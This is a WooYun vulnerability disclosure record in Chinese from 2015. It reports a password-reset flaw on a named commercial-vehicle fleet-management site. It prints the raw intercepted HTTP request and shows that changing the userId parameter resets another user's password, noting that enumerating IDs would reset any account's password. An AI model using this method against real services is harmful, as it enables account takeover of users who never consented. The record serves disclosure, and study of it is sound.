{"id": 65736, "wybug_id": "wooyun-2015-0136943", "wybug_title": "某商用车车队管理的智能服务系统可越权修改其他用户密码（可将他人的密码任意修改）", "wybug_corp": "车队宝服务系统", "wybug_author": "帅克笛枫", "wybug_date": "2015-08-25 21:45", "wybug_open_date": "2015-10-09 21:46", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口未加权限认证", "越权操作", "未授权访问", "认证设计不合理", "平行权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-25：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-10-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： ~~就这样被你征服 切断了所有退路~我的心情是坚固~我的剧情已落幕 我的爱恨已入土~所有的辩解都让对方以为是企图~却浇不熄我胸口灼热的愤怒~就这样被你征服 详细说明：  访问：http://www.xingchetong.com/xingchetong/如图所示：\n\n访问http://g.xingchetong.com/SystemUser!exitSys.do，打开登录界面，如图所示：\n\n这边先注册两个账号，账号1用户名：xinchetong 密码：12345abc账号2用户名：xingchetong密码：12345abcd ，使用两个不同邮箱申请，如图所示：\n\n\n\n另外一个账号的邮箱，如图所示：\n\n\n\n点击忘记密码，以用户xingchetong为例，如图所示：\n\n密码重置链接发送至邮箱，如图所示：\n\n进入邮箱点击打开密码重置链接，打开burp进行截取抓包，如图所示：\n\n代码如下所示：POST /SystemUser!doPwdReset.do HTTP/1.1Host: g.xingchetong.comProxy-Connection: keep-aliveContent-Length: 47Accept: text/plain, */*; q=0.01Origin: http://g.xingchetong.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Content-Type: application/x-www-form-urlencoded;charset=UTF-8Referer: http://g.xingchetong.com/SystemUser!pwdReset.do?t=f46035ab-6369-4182-b31e-7d8739ed1dd1Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=16gss8bghy5r43pmp4ljm9nf4; Hm_lvt_1ec17053225238c501306f886b999233=1440419882; Hm_lpvt_1ec17053225238c501306f886b999233=1440421850userId=67&passWord=12345abcdgpasswordtwo=12345abcd将userId=67改为66（xinchetong的userid）这个ID如图所示\n\n，可通过另外一个账号同样用burp截图抓包获取，xinchetong的userid如图所示：\n\n   漏洞证明：  点击go，如图所示：\n\n显示更改密码成功，登录xinchetong账号，如图所示：\n\n因为只有修改ID66的密码，后面重新测试下userid67，账号xingchetong，密码也同样被更新修改为userid66一样的密码。\n\n这个只要在repeater中将userid遍历一遍，可更改任意用户的密码~~   修复方案：  ~token,验证码什么的都木有~~修复你们更专业~   版权声明：转载请注明来源 帅克笛枫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：18 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 18, "Ranks": null}